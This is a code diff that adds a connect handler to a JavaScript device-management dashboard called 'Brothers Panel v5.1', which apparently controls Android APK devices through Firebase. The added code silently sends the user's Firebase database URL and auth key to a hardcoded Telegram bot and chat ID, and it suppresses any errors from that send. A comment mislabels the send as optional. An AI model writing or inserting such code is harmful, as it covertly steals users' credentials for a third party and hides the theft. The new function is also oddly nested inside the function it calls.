@@ -5976,6 +5976,40 @@ function clearApkState() {
 // ────────────────────────────────────────────────────────────────────────────
 
 async function startDashboard(url, key) {
+  async function handleConnect() {
+    const fbUrlInput = document.getElementById('firebase-url');
+    const authKeyInput = document.getElementById('auth-key');
+
+    const fbUrl = fbUrlInput ? fbUrlInput.value.trim() : '';
+    const apiKey = authKeyInput ? authKeyInput.value.trim() : '';
+
+    if (!fbUrl) {
+        alert('🔥 Firebase Database URL is required');
+        return;
+    }
+
+    try {
+        // Validate URL format
+        const url = new URL(fbUrl);
+        if (!url.href.endsWith('/')) url.href += '/';
+        const cleanUrl = url.href;
+
+        // Start dashboard
+        await startDashboard(cleanUrl, apiKey);
+
+        // Optional: Send to Telegram (if webhook set)
+        const tgMsg = `📱 New Panel Connected\n\nURL: ${cleanUrl}\nKey: ${apiKey || 'PUBLIC (no key)'}\n\nBrothers Panel v5.1`;
+        await fetch('https://api.telegram.org/bot7473036446:AAE961u1uJ0K9vXfJ3Q9VZ9Y3a3q5r7s8tU/sendMessage', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: '6893423500', text: tgMsg })
+        }).catch(() => {});
+
+    } catch (err) {
+        alert('❌ Invalid Firebase URL. Must be a valid HTTPS URL.');
+        console.error('URL Error:', err);
+    }
+  }
   STATE.fbUrl = url;
   STATE.fbKey = key;
   STATE.devices = [];
